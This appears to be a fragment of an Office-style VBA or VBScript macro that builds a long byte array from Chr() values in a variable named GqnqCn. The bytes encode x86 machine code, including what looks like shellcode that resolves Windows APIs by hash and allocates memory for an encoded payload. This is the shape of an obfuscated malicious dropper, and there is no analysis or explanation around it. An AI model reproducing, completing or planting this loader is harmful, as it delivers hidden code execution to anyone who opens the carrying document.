GqnqCn=GqnqCn&Chr(141)&Chr(12)&Chr(241)&Chr(139)&Chr(121)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(75)&Chr(4)&Chr(137)&Chr(89)&Chr(8)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(6)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(6)&Chr(4)&Chr(131)&Chr(254)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(206)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(57)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(206)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(78)&Chr(224)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(121)&Chr(4)&Chr(141)&Chr(132)&Chr(144)
GqnqCn=GqnqCn&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(78)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(16)&Chr(137)&Chr(3)&Chr(137)&Chr(68)&Chr(24)&Chr(252)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(8)&Chr(107)&Chr(192)&Chr(20)&Chr(3)&Chr(5)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(193)&Chr(23)&Chr(131)&Chr(225)&Chr(240)&Chr(137)&Chr(77)&Chr(240)&Chr(193)&Chr(249)&Chr(4)&Chr(83)&Chr(73)&Chr(131)&Chr(249)&Chr(32)&Chr(86)&Chr(87)&Chr(125)&Chr(11)&Chr(131)&Chr(206)&Chr(255)&Chr(211)&Chr(238)&Chr(131)&Chr(77)&Chr(248)&Chr(255)&Chr(235)&Chr(13)&Chr(131)&Chr(193)&Chr(224)&Chr(131)&Chr(202)&Chr(255)&Chr(51)&Chr(246)&Chr(211)&Chr(234)
GqnqCn=GqnqCn&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(13)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(217)&Chr(235)&Chr(17)&Chr(139)&Chr(83)&Chr(4)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(232)&Chr(59)&Chr(216)&Chr(117)&Chr(127)&Chr(139)&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(17)&Chr(139)&Chr(83)&Chr(4)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(232)&Chr(59)&Chr(217)&Chr(117)&Chr(91)&Chr(235)&Chr(12)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(240)&Chr(59)&Chr(216)&Chr(117)&Chr(49)&Chr(139)
GqnqCn=GqnqCn&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(9)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(240)&Chr(59)&Chr(217)&Chr(117)&Chr(21)&Chr(232)&Chr(160)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(216)&Chr(137)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(9)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(232)&Chr(58)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(75)&Chr(16)&Chr(137)&Chr(1)&Chr(139)&Chr(67)&Chr(16)&Chr(131)&Chr(56)&Chr(255)&Chr(116)&Chr(229)&Chr(137)&Chr(29)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(16)&Chr(139)&Chr(16)&Chr(137)&Chr(85)&Chr(252)&Chr(131)&Chr(250)&Chr(255)&Chr(116)&Chr(20)&Chr(139)&Chr(140)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(124)&Chr(144)&Chr(68)&Chr(35)&Chr(77)
GqnqCn=GqnqCn&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(207)&Chr(117)&Chr(41)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(72)&Chr(68)&Chr(139)&Chr(57)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(14)&Chr(255)&Chr(69)&Chr(252)&Chr(139)&Chr(145)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(193)&Chr(4)&Chr(235)&Chr(231)&Chr(139)&Chr(85)&Chr(252)&Chr(139)&Chr(202)&Chr(105)&Chr(201)&Chr(4)&Chr(2)&Chr(0)&Chr(252)&Chr(232)&Chr(206)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(96)&Chr(137)&Chr(229)&Chr(49)&Chr(210)&Chr(144)&Chr(100)&Chr(139)&Chr(82)&Chr(48)&Chr(139)&Chr(82)&Chr(12)&Chr(139)&Chr(82)&Chr(20)&Chr(144)&Chr(139)&Chr(114)&Chr(40)&Chr(15)&Chr(183)&Chr(74)&Chr(38)&Chr(49)&Chr(255)&Chr(49)&Chr(192)&Chr(172)&Chr(60)&Chr(97)&Chr(144)&Chr(124)&Chr(3)&Chr(44)&Chr(32)&Chr(144)&Chr(193)
GqnqCn=GqnqCn&Chr(207)&Chr(13)&Chr(144)&Chr(1)&Chr(199)&Chr(144)&Chr(226)&Chr(236)&Chr(82)&Chr(87)&Chr(139)&Chr(82)&Chr(16)&Chr(139)&Chr(66)&Chr(60)&Chr(1)&Chr(208)&Chr(139)&Chr(64)&Chr(120)&Chr(133)&Chr(192)&Chr(144)&Chr(15)&Chr(132)&Chr(126)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(208)&Chr(80)&Chr(139)&Chr(72)&Chr(24)&Chr(139)&Chr(88)&Chr(32)&Chr(1)&Chr(211)&Chr(227)&Chr(112)&Chr(235)&Chr(5)&Chr(18)&Chr(105)&Chr(199)&Chr(56)&Chr(229)&Chr(73)&Chr(139)&Chr(52)&Chr(139)&Chr(1)&Chr(214)&Chr(144)&Chr(49)&Chr(255)&Chr(144)&Chr(49)&Chr(192)&Chr(144)&Chr(172)&Chr(193)&Chr(207)&Chr(13)&Chr(1)&Chr(199)&Chr(56)&Chr(224)&Chr(117)&Chr(243)&Chr(144)&Chr(3)&Chr(125)&Chr(248)&Chr(144)&Chr(235)&Chr(2)&Chr(199)&Chr(64)&Chr(59)&Chr(125)&Chr(36)&Chr(117)&Chr(210)&Chr(88)&Chr(144)&Chr(235)&Chr(8)&Chr(150)&Chr(14)&Chr(143)&Chr(252)&Chr(178)&Chr(95)&Chr(66)&Chr(78)&Chr(139)
GqnqCn=GqnqCn&Chr(88)&Chr(36)&Chr(1)&Chr(211)&Chr(144)&Chr(102)&Chr(139)&Chr(12)&Chr(75)&Chr(144)&Chr(139)&Chr(88)&Chr(28)&Chr(144)&Chr(1)&Chr(211)&Chr(139)&Chr(4)&Chr(139)&Chr(1)&Chr(208)&Chr(137)&Chr(68)&Chr(36)&Chr(36)&Chr(91)&Chr(91)&Chr(97)&Chr(144)&Chr(89)&Chr(144)&Chr(235)&Chr(8)&Chr(183)&Chr(64)&Chr(239)&Chr(139)&Chr(216)&Chr(172)&Chr(12)&Chr(112)&Chr(90)&Chr(235)&Chr(7)&Chr(217)&Chr(56)&Chr(79)&Chr(137)&Chr(83)&Chr(122)&Chr(225)&Chr(81)&Chr(255)&Chr(224)&Chr(144)&Chr(88)&Chr(144)&Chr(95)&Chr(90)&Chr(139)&Chr(18)&Chr(144)&Chr(233)&Chr(68)&Chr(255)&Chr(255)&Chr(255)&Chr(144)&Chr(93)&Chr(190)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(64)&Chr(144)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(104)&Chr(88)&Chr(164)&Chr(83)&Chr(229)&Chr(255)&Chr(213)&Chr(137)&Chr(195)&Chr(137)&Chr(199)&Chr(137)&Chr(241)&Chr(232)&Chr(51)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(94)&Chr(242)&Chr(164)&Chr(232)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(187)&Chr(224)&Chr(29)&Chr(42)&Chr(10)&Chr(104)&Chr(166)&Chr(149)&Chr(189)&Chr(157)&Chr(255)&Chr(213)&Chr(60)&Chr(6)&Chr(124)&Chr(10)&Chr(128)&Chr(251)&Chr(224)&Chr(117)&Chr(5)&Chr(187)&Chr(71)&Chr(19)&Chr(114)&Chr(111)&Chr(106)&Chr(0)&Chr(83)&Chr(255)&Chr(213)&Chr(49)&Chr(192)&Chr(100)&Chr(255)&Chr(48)&Chr(100)&Chr(137)&Chr(32)&Chr(255)&Chr(211)&Chr(235)&Chr(213)&Chr(232)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(221)&Chr(199)&Chr(43)&Chr(201)&Chr(177)&Chr(75)&Chr(217)&Chr(116)&Chr(36)&Chr(244)&Chr(90)&Chr(189)&Chr(61)&Chr(131)&Chr(218)&Chr(144)&Chr(131)&Chr(234)&Chr(252)&Chr(49)&Chr(106)&Chr(22)&Chr(3)&Chr(106)&Chr(22)&Chr(226)&Chr(200)&Chr(127)&Chr(50)&Chr(25)&Chr(50)&Chr(128)&Chr(195)&Chr(122)&Chr(187)&Chr(101)&Chr(242)&Chr(168)&Chr(223)&Chr(238)&Chr(167)
GqnqCn=GqnqCn&Chr(124)&Chr(148)&Chr(163)&Chr(75)&Chr(246)&Chr(248)&Chr(87)&Chr(223)&Chr(122)&Chr(212)&Chr(88)&Chr(104)&Chr(48)&Chr(2)&Chr(86)&Chr(105)&Chr(244)&Chr(138)&Chr(52)&Chr(169)&Chr(150)&Chr(118)&Chr(71)&Chr(254)&Chr(120)&Chr(71)&Chr(136)&Chr(243)&Chr(121)&Chr(128)&Chr(245)&Chr(252)&Chr(40)&Chr(89)&Chr(113)&Chr(174)&Chr(220)&Chr(238)&Chr(199)&Chr(115)&Chr(220)&Chr(32)&Chr(76)&Chr(203)&Chr(166)&Chr(69)&Chr(147)&Chr(184)&Chr(28)&Chr(68)&Chr(196)&Chr(17)&Chr(42)&Chr(14)&Chr(252)&Chr(26)&Chr(116)&Chr(174)&Chr(253)&Chr(207)&Chr(102)&Chr(146)&Chr(180)&Chr(100)&Chr(92)&Chr(97)&Chr(71)&Chr(173)&Chr(172)&Chr(138)&Chr(121)&Chr(145)&Chr(99)&Chr(181)&Chr(181)&Chr(28)&Chr(125)&Chr(242)&Chr(114)&Chr(255)&Chr(8)&Chr(8)&Chr(129)&Chr(130)&Chr(10)&Chr(203)&Chr(251)&Chr(88)&Chr(158)&Chr(201)&Chr(92)&Chr(42)&Chr(56)&Chr(41)&Chr(92)&Chr(255)&Chr(223)&Chr(186)&Chr(82)&Chr(180)
GqnqCn=GqnqCn&Chr(148)&Chr(228)&Chr(118)&Chr(75)&Chr(120)&Chr(159)&Chr(131)&Chr(192)&Chr(127)&Chr(79)&Chr(2)&Chr(146)&Chr(91)&Chr(75)&Chr(78)&Chr(64)&Chr(197)&Chr(202)&Chr(42)&Chr(39)&Chr(250)&Chr(12)&Chr(146)&Chr(152)&Chr(94)&Chr(71)&Chr(49)&Chr(204)&Chr(217)&Chr(10)&Chr(94)&Chr(33)&Chr(212)&Chr(180)&Chr(158)&Chr(45)&Chr(111)&Chr(199)&Chr(172)&Chr(242)&Chr(219)&Chr(79)&Chr(157)&Chr(123)&Chr(194)&Chr(136)&Chr(226)&Chr(81)&Chr(178)&Chr(6)&Chr(29)&Chr(90)&Chr(195)&Chr(15)&Chr(218)&Chr(14)&Chr(147)&Chr(39)&Chr(203)&Chr(46)&Chr(120)&Chr(183)&Chr(244)&Chr(250)&Chr(47)&Chr(231)&Chr(90)&Chr(85)&Chr(144)&Chr(87)&Chr(27)&Chr(5)&Chr(120)&Chr(189)&Chr(148)&Chr(122)&Chr(152)&Chr(190)&Chr(126)&Chr(19)&Chr(104)&Chr(155)&Chr(210)&Chr(116)&Chr(137)&Chr(27)&Chr(175)&Chr(237)&Chr(4)&Chr(253)&Chr(37)&Chr(254)&Chr(64)&Chr(86)&Chr(210)&Chr(60)&Chr(183)&Chr(111)&Chr(69)&Chr(62)
GqnqCn=GqnqCn&Chr(157)&Chr(220)&Chr(222)&Chr(168)&Chr(169)&Chr(11)&Chr(216)&Chr(215)&Chr(41)&Chr(30)&Chr(74)&Chr(123)&Chr(129)&Chr(200)&Chr(25)&Chr(151)&Chr(22)&Chr(233)&Chr(29)&Chr(178)&Chr(62)&Chr(126)&Chr(137)&Chr(72)&Chr(175)&Chr(205)&Chr(43)&Chr(76)&Chr(250)&Chr(167)&Chr(171)&Chr(216)&Chr(1)&Chr(97)&Chr(251)&Chr(116)&Chr(8)&Chr(84)&Chr(203)&Chr(218)&Chr(243)&Chr(179)&Chr(71)&Chr(210)&Chr(97)&Chr(123)&Chr(48)&Chr(27)&Chr(102)&Chr(123)&Chr(192)&Chr(77)&Chr(236)&Chr(123)&Chr(168)&Chr(41)&Chr(84)&Chr(40)&Chr(205)&Chr(53)&Chr(65)&Chr(93)&Chr(94)&Chr(160)&Chr(106)&Chr(55)&Chr(50)&Chr(99)&Chr(3)&Chr(181)&Chr(109)&Chr(67)&Chr(140)&Chr(70)&Chr(88)&Chr(85)&Chr(240)&Chr(145)&Chr(165)&Chr(211)&Chr(0)&Chr(148)&Chr(197)&Chr(31)&Chr(230)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)
GqnqCn=GqnqCn&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(85)&Chr(139)&Chr(76)&Chr(36)&Chr(8)&Chr(139)&Chr(41)&Chr(255)&Chr(113)&Chr(28)&Chr(255)&Chr(113)&Chr(24)&Chr(255)&Chr(113)&Chr(40)&Chr(232)&Chr(21)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(85)&Chr(86)&Chr(87)&Chr(83)&Chr(139)&Chr(234)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(210)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(255)&Chr(209)&Chr(91)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(29)&Chr(234)&Chr(139)&Chr(241)&Chr(139)&Chr(193)&Chr(106)&Chr(1)&Chr(232)&Chr(27)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(201)&Chr(51)&Chr(210)&Chr(51)&Chr(255)&Chr(255)&Chr(230)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(39)&Chr(81)&Chr(64)&Chr(0)&Chr(81)&Chr(232)&Chr(247)
GqnqCn=GqnqCn&Chr(32)&Chr(0)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(108)&Chr(36)&Chr(8)&Chr(82)&Chr(81)&Chr(255)&Chr(116)&Chr(36)&Chr(20)&Chr(232)&Chr(180)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(8)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(86)&Chr(116)&Chr(8)&Chr(106)&Chr(10)&Chr(232)&Chr(211)&Chr(195)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(131)&Chr(221)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(106)&Chr(22)&Chr(232)&Chr(133)&Chr(221)&Chr(255)&Chr(255)&Chr(89)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(2)&Chr(15)&Chr(132)&Chr(202)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(4)&Chr(141)&Chr(69)&Chr(4)&Chr(137)&Chr(133)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(48)
GqnqCn=GqnqCn&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(181)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(252)&Chr(106)&Chr(80)&Chr(137)&Chr(133)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(94)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(21)&Chr(0)&Chr(0)&Chr(64)&Chr(137)&Chr(181)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)&Chr(128)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(97)&Chr(194)&Chr(255)&Chr(255)&Chr(204)&Chr(131)&Chr(37)&Chr(172)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(133)&Chr(210)&Chr(116)&Chr(105)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(132)&Chr(192)&Chr(117)&Chr(22)&Chr(129)&Chr(250)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(14)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(5)&Chr(233)&Chr(254)&Chr(22)&Chr(0)&Chr(0)&Chr(87)&Chr(139)&Chr(249)&Chr(131)&Chr(250)&Chr(4)&Chr(114)&Chr(49)&Chr(247)&Chr(217)&Chr(131)&Chr(225)&Chr(3)&Chr(116)&Chr(12)&Chr(43)&Chr(209)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(233)
GqnqCn=GqnqCn&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(8)&Chr(3)&Chr(193)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(16)&Chr(3)&Chr(193)&Chr(139)&Chr(202)&Chr(131)&Chr(226)&Chr(3)&Chr(193)&Chr(233)&Chr(2)&Chr(116)&Chr(6)&Chr(243)&Chr(171)&Chr(133)&Chr(210)&Chr(116)&Chr(10)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(234)&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(95)&Chr(195)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(200)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(194)&Chr(210)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(93)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(223)&Chr(15)&Chr(149)&Chr(192)&Chr(59)&Chr(199)&Chr(117)&Chr(29)&Chr(232)&Chr(207)&Chr(216)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(232)&Chr(87)
GqnqCn=GqnqCn&Chr(216)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(83)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(56)&Chr(106)&Chr(4)&Chr(232)&Chr(213)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(221)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(11)&Chr(139)&Chr(115)&Chr(252)&Chr(131)&Chr(238)&Chr(9)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(3)&Chr(139)&Chr(117)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(37)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(16)&Chr(83)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(200)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(139)&Chr(198)&Chr(232)&Chr(130)&Chr(210)&Chr(255)&Chr(255)&Chr(195)
GqnqCn=GqnqCn&Chr(51)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(4)&Chr(232)&Chr(163)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(2)&Chr(232)&Chr(160)&Chr(190)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(131)&Chr(232)&Chr(8)&Chr(129)&Chr(56)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(112)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(241)&Chr(57)&Chr(29)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(83)&Chr(83)&Chr(51)&Chr(255)&Chr(71)&Chr(87)&Chr(104)&Chr(224)&Chr(136)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(83)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(61)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(21)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(199)&Chr(5)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(93)&Chr(20)&Chr(126)&Chr(34)&Chr(139)&Chr(77)&Chr(20)&Chr(139)&Chr(69)&Chr(16)&Chr(73)&Chr(56)&Chr(24)&Chr(116)&Chr(8)&Chr(64)&Chr(59)&Chr(203)&Chr(117)&Chr(246)&Chr(131)&Chr(201)&Chr(255)&Chr(139)&Chr(69)&Chr(20)&Chr(43)&Chr(193)&Chr(72)&Chr(59)&Chr(69)&Chr(20)&Chr(125)&Chr(1)&Chr(64)&Chr(137)&Chr(69)&Chr(20)&Chr(161)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(172)&Chr(1)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(57)&Chr(93)&Chr(36)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(143)&Chr(1)&Chr(0)&Chr(0)&Chr(126)&Chr(67)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(247)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(55)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)
